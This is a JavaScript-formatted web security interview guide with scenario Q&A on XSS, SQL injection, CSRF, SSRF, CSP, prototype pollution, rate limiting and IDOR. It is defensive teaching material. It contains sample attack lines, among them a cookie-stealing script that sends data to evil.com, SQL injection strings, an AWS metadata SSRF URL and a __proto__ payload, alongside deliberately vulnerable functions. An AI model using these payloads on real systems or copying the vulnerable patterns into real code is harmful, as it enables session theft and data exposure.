# Web Security — Interview Revision Summary

> **Target:** 7+ year Full Stack MERN Developer | **Files:** 1

## Table of Contents

9. [FILE: 01_theory_interview_qa.js](#file-01_theory_interview_qajs)

---

<a id="web-security-theory-interview-qa"></a>
## FILE: 01_theory_interview_qa.js

/*
=============================================================
  WEB SECURITY — THEORY / INTERVIEW Q&A
  Basic → Intermediate → Advanced
  Covers OWASP Top 10 + browser security + full-stack patterns
  For 7+ years experience
=============================================================
*/

// ─────────────────────────────────────────────────────────
// ██ SECTION 1: BASIC
// ─────────────────────────────────────────────────────────

/*
Q1 [BASIC]: What is Cross-Site Scripting (XSS) and how do you prevent it?
──────────────────────────────────────────────────────────────────────────
A: XSS: attacker injects malicious script into a page served to other users.
   Script runs in the victim's browser with the victim's cookies/session.

   Types:
   - Stored XSS: malicious script saved in DB, served to all visitors
   - Reflected XSS: script in URL parameter, reflected in response
   - DOM-based XSS: client-side JS writes user input to the DOM unsafely

   Prevention:
   1. Output encoding: HTML-encode all user content before rendering (React does this by default)
   2. Content-Security-Policy header: restrict which scripts can execute
   3. Use textContent/innerText instead of innerHTML
   4. Sanitise HTML if you must render it (DOMPurify)
   5. HttpOnly cookies: JS cannot read session cookies even if XSS occurs
*/

// VULNERABLE:
function renderUserCommentBad(comment) {
  // innerHTML interprets HTML tags in user input — any <script> tag executes
  document.getElementById('comment').innerHTML = comment;
  // If comment = '<script>fetch("evil.com?c=" + document.cookie)</script>' → session stolen
}

// SAFE:
function renderUserCommentSafe(comment) {
  // textContent HTML-encodes the string — tags are displayed as text, not executed
  document.getElementById('comment').textContent = comment;
}

// If you MUST render HTML (rich text editor output), sanitise first:
const DOMPurify = require('dompurify');  // browser library
function renderRichText(html) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href'],         // don't allow on* event attributes like onclick
  });
  document.getElementById('content').innerHTML = clean;
}

// React protects by default — JSX auto-escapes:
function SafeReactComponent({ userInput }) {
  return <div>{userInput}</div>;  // safe — React escapes HTML entities
  // DANGEROUS escape hatch — only with fully sanitised input:
  // return <div dangerouslySetInnerHTML={{ __html: sanitisedHtml }} />;
}

// Content-Security-Policy header (see Q7 for full details):
// Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

/*
Q2 [BASIC]: What is SQL Injection and how do you prevent it?
──────────────────────────────────────────────────────────────
A: SQL Injection: attacker includes SQL syntax in input to manipulate database queries.
   Classic example: input "' OR '1'='1" bypasses login checks entirely.

   Prevention:
   1. Parameterised queries / prepared statements — NEVER string-concatenate SQL
   2. ORM with proper query builder
   3. Input validation (reject unexpected characters)
   4. Least privilege: DB user should only have SELECT/INSERT needed
   5. WAF (Web Application Firewall) as defence-in-depth
*/

// VULNERABLE — string concatenation:
async function loginBad(username, password) {
  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
  // Input: username = "admin'--"
  // Results in: SELECT * FROM users WHERE username='admin'--' AND password='...'
  // The -- comments out the password check → instant admin access
}

// SAFE — parameterised query (node-postgres example):
const { Pool } = require('pg');
const pool = new Pool();

async function loginSafe(username, password) {
  const result = await pool.query(
    'SELECT id, email FROM users WHERE username = $1 AND password_hash = $2',
    [username, password]  // ← parameters are NEVER interpolated into SQL
    // DB driver sends SQL and data separately; no SQL syntax interpretation of data
  );
  return result.rows[0] || null;
}

// ORM (Prisma) — safe by default:
async function findUserOrm(username) {
  return prisma.user.findUnique({
    where: { username },  // ← Prisma generates parameterised queries internally
  });
}
const prisma = { user: { findUnique: async (q) => null } };

/*
Q3 [BASIC]: What is CSRF (Cross-Site Request Forgery) and how do you prevent it?
──────────────────────────────────────────────────────────────────────────────────
A: CSRF: tricks an authenticated user's browser into making unwanted requests to
   a server where they're logged in. The server can't distinguish real vs forged requests.

   Attack: victim visits evil.com which has:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
   If victim is logged into bank.com, browser automatically sends cookies → transfer happens.

   Prevention:
   1. SameSite=Strict/Lax cookie attribute (modern, most effective)
   2. CSRF tokens (synchroniser token pattern)
   3. Double-submit cookie pattern
   4. Check Origin/Referer header
   5. Custom request header (X-Requested-With) — simple requests can't send custom headers
*/

// Express CSRF protection:
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const express = require('express');
const app = express();

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Include CSRF token in HTML form:
app.get('/transfer', (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
  // Form includes: <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  // Server validates token on POST — forged requests from evil.com won't have it
});

// Modern approach: SameSite cookie (eliminates CSRF for most cases):
/*
res.cookie('sessionId', token, {
  httpOnly: true,            // ← JS cannot read cookie (prevents XSS cookie theft)
  secure: true,              // ← HTTPS only
  sameSite: 'Strict',        // ← cookie NOT sent on cross-site requests at all
  // sameSite: 'Lax'         // ← sent on top-level GET navigation, not POST/iframe
  // sameSite: 'None'        // ← sent on all cross-site requests (requires secure: true)
});
*/

// ─────────────────────────────────────────────────────────
// ██ SECTION 2: INTERMEDIATE
// ─────────────────────────────────────────────────────────

/*
Q4 [INTERMEDIATE]: What is the Same-Origin Policy (SOP) and how does CORS work?
─────────────────────────────────────────────────────────────────────────────────
A: Same-Origin Policy: browsers block JS from reading responses from a DIFFERENT origin.
   Origin = protocol + hostname + port. https://a.com and http://a.com are DIFFERENT origins.

   CORS (Cross-Origin Resource Sharing): the server opts-in to allowing cross-origin reads
   via Access-Control-Allow-* response headers.

   Simple requests (GET, POST with text/plain): browser sends request + Origin header,
   checks Access-Control-Allow-Origin in response.
   Preflight requests (PUT/DELETE/custom headers): browser sends OPTIONS first,
   checks permissions, then sends actual request if allowed.
*/

// Express CORS middleware — properly configured:
const cors = require('cors');

// BAD: wildcard with credentials — browsers reject this combination
// app.use(cors({ origin: '*', credentials: true }));

// GOOD: whitelist specific origins:
const allowedOrigins = [
  'https://myapp.com',
  'https://admin.myapp.com',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
].filter(Boolean);

app.use(cors({
  origin: (requestOrigin, callback) => {
    if (!requestOrigin || allowedOrigins.includes(requestOrigin)) {
      callback(null, true);
    } else {
      callback(new Error(`Origin ${requestOrigin} not allowed by CORS`));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  credentials: true,           // ← allow cookies/auth headers in cross-origin requests
  maxAge: 86400,               // ← cache preflight response for 24 hours (reduces OPTIONS requests)
}));

/*
Q5 [INTERMEDIATE]: What security headers should every web application set?
────────────────────────────────────────────────────────────────────────────
A: Security headers are the fastest wins — a few lines of code harden against entire
   categories of attacks. Use helmet.js in Express to set them all.
*/
const helmet = require('helmet');

// helmet.js sets all these with sensible defaults:
app.use(helmet());

// Let's understand each header:

// 1. Content-Security-Policy (CSP) — most powerful, must be customised:
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],                   // only load resources from same origin
    scriptSrc: ["'self'", "'nonce-{NONCE}'"], // only scripts with matching nonce execute
    // Do NOT use 'unsafe-inline' — defeats purpose of CSP for XSS protection
    styleSrc: ["'self'", 'https://fonts.googleapis.com'],
    imgSrc: ["'self'", 'data:', 'https://images.example.com'],
    connectSrc: ["'self'", 'https://api.example.com'],
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    objectSrc: ["'none'"],                    // block Flash, Java applets
    frameAncestors: ["'none'"],               // blocks this page from being iframed (anti-clickjacking)
    upgradeInsecureRequests: [],              // auto-upgrade http:// to https://
  },
}));

// 2. HTTP Strict-Transport-Security — forces HTTPS for future visits:
// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
// Once set, browser NEVER makes HTTP request to this domain again (for max-age seconds)

// 3. X-Frame-Options — prevent clickjacking (superseded by CSP frameAncestors):
// X-Frame-Options: DENY

// 4. X-Content-Type-Options — prevent MIME sniffing:
// X-Content-Type-Options: nosniff
// Without this: browser may execute text/plain as JS if it looks like a script

// 5. Permissions-Policy — restrict browser features:
// Permissions-Policy: camera=(), microphone=(), geolocation=(self)

// 6. Referrer-Policy — control what URL is sent as Referer:
// Referrer-Policy: strict-origin-when-cross-origin

/*
Q6 [INTERMEDIATE]: What is authentication vs authorisation? JWT vs Session.
────────────────────────────────────────────────────────────────────────────
A: Authentication: who are you? (verify identity)
   Authorisation:  what can you do? (enforce permissions)

   Sessions (server-side state):
   + Can be invalidated instantly (just delete from store)
   + Session data never exposed to client
   - Requires shared session store for horizontal scaling (Redis)
   - Stateful — server must look up session on every request

   JWT (JSON Web Tokens, stateless):
   + No server-side state — works across multiple services
   + Self-contained: contains claims (userId, roles)
   - Cannot be invalidated before expiry (must use short expiry + refresh tokens)
   - Larger than session ID (more data sent per request)
   - Leaking the JWT secret compromises ALL tokens
*/

// JWT — proper implementation:
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Sign (on login):
function createTokens(userId, roles) {
  const accessToken = jwt.sign(
    { sub: userId, roles, type: 'access' },
    process.env.JWT_SECRET,
    {
      expiresIn: '15m',          // ← short-lived! If stolen, expires in 15 minutes
      issuer: 'myapp.com',
      audience: 'myapp.com',
    }
  );

  const refreshToken = jwt.sign(
    { sub: userId, type: 'refresh', jti: crypto.randomUUID() }, // jti: unique token ID
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  return { accessToken, refreshToken };
}

// Verify (on each request):
function verifyAccessToken(token) {
  try {
    return jwt.verify(token, process.env.JWT_SECRET, {
      issuer: 'myapp.com',
      audience: 'myapp.com',
    });
  } catch (err) {
    if (err.name === 'TokenExpiredError') throw new Error('Token expired');
    throw new Error('Invalid token');
  }
}

// Store refresh tokens in HttpOnly cookie (not localStorage — XSS can read localStorage):
/*
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,    // JS cannot read — prevents XSS theft
  secure: true,      // HTTPS only
  sameSite: 'Strict',
  path: '/auth/refresh',  // ← only sent to refresh endpoint (reduce attack surface)
  maxAge: 7 * 24 * 60 * 60 * 1000,
});
*/

/*
Q7 [INTERMEDIATE]: What is Server-Side Request Forgery (SSRF)?
───────────────────────────────────────────────────────────────
A: SSRF: attacker tricks the server into making HTTP requests to internal resources.
   The server sits inside the network boundary — it can reach internal services
   (metadata API, Redis, databases) that the attacker cannot reach directly.

   Classic AWS SSRF attack:
   App fetches URL from user input →
   Attacker provides http://169.254.169.254/latest/meta-data/iam/security-credentials/ →
   App returns AWS IAM credentials to attacker → full account takeover.
*/

// VULNERABLE:
async function fetchExternalResourceBad(url) {
  const response = await fetch(url);  // ← user controls url
  // If url = 'http://169.254.169.254/...' → internal AWS metadata exposed
  // If url = 'http://localhost:6379' → internal Redis exposed
  return response.text();
}

// SAFE: strict URL validation before fetching:
const { URL } = require('url');
const dns = require('dns').promises;

async function fetchExternalResourceSafe(inputUrl) {
  let parsed;
  try {
    parsed = new URL(inputUrl);
  } catch {
    throw new Error('Invalid URL');
  }

  // Only allow HTTPS
  if (parsed.protocol !== 'https:') throw new Error('Only HTTPS URLs allowed');

  // Block private IP ranges and loopback:
  const ip = await dns.lookup(parsed.hostname);
  if (isPrivateIP(ip.address)) throw new Error('Private/internal addresses not allowed');

  // Domain allowlist (best approach):
  const allowedDomains = ['api.partner.com', 'cdn.example.com'];
  if (!allowedDomains.includes(parsed.hostname)) throw new Error('Domain not in allowlist');

  return fetch(inputUrl);
}

function isPrivateIP(ip) {
  // Block: 10.x.x.x, 172.16-31.x.x, 192.168.x.x, 127.x.x.x, 169.254.x.x (link-local)
  return /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.|::1|fc00:|fe80:)/.test(ip);
}

// ─────────────────────────────────────────────────────────
// ██ SECTION 3: ADVANCED
// ─────────────────────────────────────────────────────────

/*
Q8 [ADVANCED]: What is Content Security Policy (CSP) and how do you deploy it safely?
──────────────────────────────────────────────────────────────────────────────────────
A: CSP is a browser security feature that restricts what resources a page can load/execute.
   Deployed via the Content-Security-Policy header (or <meta> tag, less powerful).
   Prevents: XSS execution, data injection, clickjacking, mixed content.

   Deployment strategy (going from loose to strict CSP):
   1. Start with Content-Security-Policy-Report-Only (report violations, don't block)
   2. Monitor violation reports to discover legitimate inline scripts / third-party sources
   3. Migrate inline scripts to external files or nonce/hash approach
   4. Switch to enforce mode
*/

// Nonce-based CSP (best practice — unique nonce per request):
function renderPageWithCSP(req, res, html) {
  const nonce = crypto.randomBytes(16).toString('base64');  // unique per request

  res.setHeader('Content-Security-Policy', [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,   // only scripts with this nonce execute
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.myapp.com`,
    `frame-ancestors 'none'`,              // no iframing
    `base-uri 'self'`,                     // prevent <base> tag injection
    `form-action 'self'`,                  // forms can only submit to same origin
  ].join('; '));

  // Inject nonce into script tags:
  const pageHtml = html.replace(/<script/g, `<script nonce="${nonce}"`);
  res.send(pageHtml);
}

// CSP Reporting — collect violations to refine policy:
/*
Content-Security-Policy: ...; report-uri /csp-report
OR (modern):
Content-Security-Policy: ...; report-to csp-endpoint

Reporting-Endpoints: csp-endpoint="https://myapp.com/csp-report"

// Violation report handler:
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const { 'csp-report': report } = req.body;
  logger.warn('CSP Violation', {
    blockedUri:    report['blocked-uri'],
    violatedDir:   report['violated-directive'],
    documentUri:   report['document-uri'],
    originalPolicy: report['original-policy'],
  });
  res.status(204).end();
});
*/

/*
Q9 [ADVANCED]: How do you implement secure rate limiting and protect against brute force?
─────────────────────────────────────────────────────────────────────────────────────────
A: Without rate limiting: login endpoints can be brute-forced, APIs abused, accounts enumerated.
   Defence-in-depth approach:
   1. Rate limiting at API gateway / reverse proxy level (Nginx, Cloudflare)
   2. Application-level rate limiting (express-rate-limit with Redis store)
   3. Account lockout after N failures
   4. Progressive delays (exponential backoff per account)
   5. CAPTCHA on sensitive endpoints
*/

const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const redis = require('ioredis');

const redisClient = redis.createClient({ url: process.env.REDIS_URL });

// Login endpoint — strict rate limit (per IP):
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutes
  max: 5,                      // 5 attempts per IP per 15 min
  standardHeaders: true,       // Return rate limit info in RateLimit-* headers
  legacyHeaders: false,
  store: new RedisStore({
    sendCommand: (...args) => redisClient.call(...args),
  }),
  keyGenerator: (req) => {
    // Rate limit per IP + per username (prevents distributed brute force)
    return `login:${req.ip}:${req.body?.username ?? 'unknown'}`;
  },
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many login attempts. Please try again in 15 minutes.',
      retryAfter: Math.ceil(req.rateLimit.resetTime / 1000),
    });
  },
});

// General API rate limit (per authenticated user):
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,   // 1 minute
  max: 100,              // 100 requests per minute per user
  keyGenerator: (req) => req.user?.id ?? req.ip,  // ← use user ID when authenticated
});

// Account lockout pattern in login handler:
async function loginHandler(req, res) {
  const { username, password } = req.body;

  const account = await db.users.findOne({ where: { username } });

  // Timing-safe comparison — prevent user enumeration via timing
  if (!account) {
    await bcrypt.compare(password, '$2b$10$dummyhashtopreventtimingattack...');
    // ← even for non-existent users, run bcrypt to prevent "user doesn't exist" timing leak
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  if (account.lockoutUntil && account.lockoutUntil > new Date()) {
    return res.status(423).json({ error: 'Account temporarily locked' });
  }

  const valid = await bcrypt.compare(password, account.passwordHash);

  if (!valid) {
    const attempts = account.failedAttempts + 1;
    const lockout  = attempts >= 10
      ? new Date(Date.now() + 30 * 60 * 1000)  // lock 30 min after 10 failures
      : null;
    await db.users.update({ failedAttempts: attempts, lockoutUntil: lockout }, { where: { id: account.id } });
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Reset on successful login:
  await db.users.update({ failedAttempts: 0, lockoutUntil: null }, { where: { id: account.id } });
  // issue session/JWT...
}
const bcrypt = require('bcrypt');
const db = { users: { findOne: async () => null, update: async () => {} } };

/*
Q10 [ADVANCED]: What is Prototype Pollution and how does it affect Node.js APIs?
──────────────────────────────────────────────────────────────────────────────────
A: Prototype pollution: attacker modifies Object.prototype via a crafted payload.
   Since all JS objects inherit from Object.prototype, adding a property there
   affects ALL objects in the process — potential RCE in some frameworks.

   Common attack vector: JSON merge/deep clone operations with untrusted input.
*/

// Vulnerable deep merge:
function deepMergeBad(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      deepMergeBad(target[key] ??= {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attack payload: { "__proto__": { "isAdmin": true } }
// After deepMergeBad({}, payload):
//   ({}).isAdmin === true   ← ALL objects now have isAdmin = true
//   Bypasses: if (user.isAdmin) checks everywhere

// Safe merge — block __proto__, constructor, prototype keys:
function deepMergeSafe(target, source, seen = new WeakSet()) {
  if (seen.has(source)) return target; // prevent circular ref
  seen.add(source);

  for (const key of Object.keys(source)) {
    // Block dangerous keys:
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;  // ← skip these entirely
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = deepMergeSafe(target[key] ?? {}, source[key], seen);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Even safer: use Object.create(null) for pure data stores (no prototype to pollute):
function parsedConfig(json) {
  const obj = Object.create(null);        // ← no prototype chain — can't be polluted
  const parsed = JSON.parse(json);
  Object.assign(obj, parsed);            // still safe because Object.assign copies own properties
  return obj;
}

/*
Q11 [ADVANCED]: How do you securely handle secrets and environment variables?
──────────────────────────────────────────────────────────────────────────────
A: Secrets management is operational security — leaking secrets is a high-impact breach.
*/

// NEVER:
// 1. Commit .env files to git
// 2. Bake secrets into Docker images (they appear in image history)
// 3. Log secrets (even in debug mode)
// 4. Set secrets as environment variables in client-side code (NEXT_PUBLIC_ prefix = public!)

// .gitignore:
// .env
// .env.local
// .env.*.local

// Environment variable validation with Zod at startup:
const { z } = require('zod');

const envSchema = z.object({
  DATABASE_URL:       z.string().url(),
  JWT_SECRET:         z.string().min(32),    // enforce minimum entropy
  JWT_REFRESH_SECRET: z.string().min(32),
  REDIS_URL:          z.string().url(),
  NODE_ENV:           z.enum(['development', 'test', 'production']),
  PORT:               z.coerce.number().default(3000),
});

function loadEnv() {
  const result = envSchema.safeParse(process.env);
  if (!result.success) {
    console.error('Invalid environment variables:', result.error.flatten().fieldErrors);
    process.exit(1);  // ← fail fast on startup, not at runtime when a secret is used
  }
  return result.data;
}

// Production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager)
// Pull secrets at startup, not from environment variables:
/*
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

async function getDbPassword() {
  const client = new SecretsManagerClient({ region: 'us-east-1' });
  const response = await client.send(
    new GetSecretValueCommand({ SecretId: 'prod/myapp/db-password' })
  );
  return JSON.parse(response.SecretString).password;
  // Rotated automatically — app gets new password without redeployment
}
*/

/*
Q12 [ADVANCED]: What is Insecure Direct Object Reference (IDOR) and how do you prevent it?
────────────────────────────────────────────────────────────────────────────────────────────
A: IDOR: API exposes a direct reference (database ID) and doesn't verify ownership.
   Attacker increments ID 1→2→3... to access other users' data.
   OWASP top 10 most common broken access control issue.
*/

// VULNERABLE API:
/*
app.get('/api/invoices/:invoiceId', authenticate, async (req, res) => {
  const invoice = await db.invoices.findById(req.params.invoiceId);
  res.json(invoice);
  // If invoice belongs to userId=5 but current user is userId=3 → data leak!
});
*/

// SAFE — always filter by authenticated user ID:
app.get('/api/invoices/:invoiceId', authenticate, async (req, res) => {
  const invoice = await db.invoices.findOne({
    where: {
      id:     req.params.invoiceId,
      userId: req.user.id,           // ← ALWAYS scope to current user
    },
  });

  if (!invoice) {
    // Return 404 NOT 403 — don't reveal that the record exists but is owned by someone else
    return res.status(404).json({ error: 'Invoice not found' });
  }

  res.json(invoice);
});

// For admin access: role check + audit log:
app.get('/api/admin/invoices/:invoiceId', authenticate, requireRole('admin'), async (req, res) => {
  const invoice = await db.invoices.findById(req.params.invoiceId);
  await auditLog({ action: 'admin_view_invoice', adminId: req.user.id, invoiceId: invoice.id });
  res.json(invoice);
});

function authenticate(req, res, next) { next(); }
function requireRole(role) { return (req, res, next) => next(); }
async function auditLog(data) {}
const db2 = { invoices: { findOne: async () => null, findById: async () => null } };
app.get = () => {};

module.exports = { loginSafe, deepMergeSafe, isPrivateIP, loadEnv };

---


---

## Scenario-Based Interview Questions

---

### Scenario 1: IDOR — Accessing Another User's Data

**Situation:** A penetration tester reports that `GET /api/invoices/1234` returns the invoice regardless of which user is logged in, as long as they know the invoice ID.

**Question:** How do you fix this Insecure Direct Object Reference (IDOR) vulnerability?

**Answer:**
- The root cause: the handler fetches the resource by ID but does NOT verify the logged-in user owns it.
- **Fix**: always scope queries by the authenticated user's ID:

```javascript
// BAD
const invoice = await Invoice.findById(req.params.id);

// GOOD
const invoice = await Invoice.findOne({
  _id: req.params.id,
  userId: req.user.id,   // scope to the authenticated user
});
if (!invoice) return res.status(404).json({ error: 'Not found' });
```

- Return 404 (not 403) when the resource doesn't belong to the user — 403 confirms the object exists, aiding enumeration.
- Use **UUIDs** instead of sequential integers for IDs — harder to enumerate, but NOT a substitute for authorisation checks.

---

### Scenario 2: XSS via User-Generated Content

**Situation:** Your platform allows users to post comments. A user posts `<script>document.cookie.split`=`alert(1)</script>` and it executes in other users' browsers, stealing session cookies.

**Question:** How do you prevent Stored XSS?

**Answer:**
- **Never trust user input**: sanitise on the way in AND escape on the way out.
- Use a whitelist-based HTML sanitiser: `DOMPurify` (client-side) or `sanitize-html` (server-side).

```javascript
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';
const purify = createDOMPurify(new JSDOM('').window);
const safeHtml = purify.sanitize(userInput); // strips all scripts, event handlers
```

- When rendering in React: avoid `dangerouslySetInnerHTML` — React escapes by default.
- Set **Content-Security-Policy** header to block inline scripts:
  `Content-Security-Policy: default-src 'self'; script-src 'self'`
- Set `HttpOnly` on session cookies so stolen cookies via `document.cookie` are impossible.

---

### Scenario 3: CSRF Attack — Funds Transfer Forged from a Malicious Website

**Situation:** Your banking app uses session cookies. A security researcher demonstrates that visiting their malicious page transfers money from the victim's account by sending a forged POST request.

**Question:** How do you prevent CSRF?

**Answer:**
- **CSRF tokens** (Synchroniser Token Pattern): generate a random token per session, embed in forms, validate server-side.
- **SameSite cookie attribute**:

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

`SameSite=Strict` prevents the cookie from being sent on cross-site requests entirely.
`SameSite=Lax` (default modern browsers) allows GET but blocks POST from cross-site.

- For REST APIs using JWT in `Authorization: Bearer` header instead of cookies — CSRF is not an issue because the browser won't auto-attach the header.
- Verify `Origin` and `Referer` headers for state-changing requests as a defence-in-depth layer.

---

### Scenario 4: SQL Injection via Search Endpoint

**Situation:** A user searches for `'; DROP TABLE products; --`. Your product search function string-interpolates the query directly into SQL.

**Question:** Fix this and explain the broader principle.

**Answer:**

```javascript
// VULNERABLE
const results = await db.query(`SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`);

// FIXED — parameterised query
const results = await db.query(
  'SELECT * FROM products WHERE name ILIKE $1',
  [`%${req.query.q.replace(/%/g, '\\%')}%`]
);
```

- **Parameterised queries / prepared statements** ensure user input is treated as data, never as SQL syntax — the DB driver handles escaping.
- Use an ORM (Sequelize, Prisma, TypeORM) — they parameterise by default.
- Layer: validate and sanitise input (max length, allowed characters) before it reaches the query.
- Use a **WAF** (Web Application Firewall) to block obvious injection patterns as a defence-in-depth layer.

---

### Scenario 5: JWT Secret Compromised — All Tokens Must Be Invalidated

**Situation:** You discover your JWT signing secret was accidentally committed to a public GitHub repo. All currently-issued JWTs are potentially compromised.

**Question:** What do you do immediately and how do you prevent it?

**Answer:**
- **Immediate response**:
  1. Rotate the secret: generate a new one and deploy immediately. This invalidates ALL existing tokens.
  2. Force re-login for all users (they will get 401 and be redirected to login).
  3. Audit GitHub history and revoke from GitHub Secrets if it was exposed there.
  4. Check audit logs for unexplained API activity with compromised tokens.

- **Prevention**:
  - Store secrets in environment variables managed by a secrets manager (AWS Secrets Manager, Vault, Azure Key Vault).
  - Add pre-commit hooks (git-secrets, detect-secrets) to block committing secrets.
  - Use `GITGUARDIAN` or GitHub Advanced Security secret scanning.
  - Rotate secrets regularly; build the rotation process so it's practiced.

---

### Scenario 6: Broken Access Control — Admin Endpoint Accessible by Regular User

**Situation:** Your REST API has `/api/admin/users` that returns all users with PII. It is only guarded by checking `req.query.isAdmin === 'true'`.

**Question:** What is wrong and how do you fix it?

**Answer:**
- **Critical flaw**: client-supplied data (`req.query`) must never be trusted for authorisation. Any user can append `?isAdmin=true`.
- **Fix**: authorisation must be based on server-side data (JWT claim, session, DB role):

```javascript
// Middleware
const requireAdmin = (req, res, next) => {
  if (!req.user?.roles?.includes('admin')) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
};

router.get('/admin/users', authenticate, requireAdmin, listUsersHandler);
```

- Roles/permissions must come from the JWT payload or DB, never from the request.
- Add **integration tests** that assert non-admin tokens get 403 on admin endpoints.

---

### Scenario 7: Rate Limiting to Prevent Brute Force on Login

**Situation:** Your login endpoint has no rate limiting. A security researcher demonstrates a credential-stuffing attack with 10 000 password attempts per minute.

**Question:** How do you defend against this?

**Answer:**
- **Rate limit by IP and by username**:

```javascript
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,                    // 10 attempts per window
  keyGenerator: (req) => req.body.email || req.ip, // per-account AND per-IP
  message: { error: 'Too many login attempts. Try again in 15 minutes.' },
  store: new RedisStore({ ... }),  // shared across instances
});
app.post('/auth/login', loginLimiter, loginHandler);
```

- Add **account lockout** after N consecutive failures (with CAPTCHA bypass to prevent DoS of legitimate users).
- Implement **CAPTCHA** (reCAPTCHA v3) on the login page after 3 failures.
- Enable **bcrypt** with cost factor 12+ for password hashing — slows brute force significantly.
- Alert on high-volume failed login attempts.

---

### Scenario 8: Dependency Vulnerability — npm audit Shows Critical CVE

**Situation:** `npm audit` reports a Critical severity RCE vulnerability in `lodash@4.17.15` which is used by 12 of your direct and transitive dependencies.

**Question:** How do you handle this systematically?

**Answer:**
1. `npm audit --json` to see all affected paths.
2. `npm audit fix` for automatic fixes on resolvable vulnerabilities.
3. For transitive dependencies you can't directly update: use `npm overrides` (npm v8+) to force a specific version:

```json
"overrides": {
  "lodash": ">=4.17.21"
}
```

4. If an override is not possible immediately, add a WAF rule to block the specific exploit payload as a temporary mitigation.
5. **Prevent recurrence**:
   - Add `npm audit --audit-level=high` to CI — fails the pipeline on high/critical CVEs.
   - Use **Dependabot** or Renovate for automatic dependency update PRs.
   - Subscribe to security advisories for your key packages.
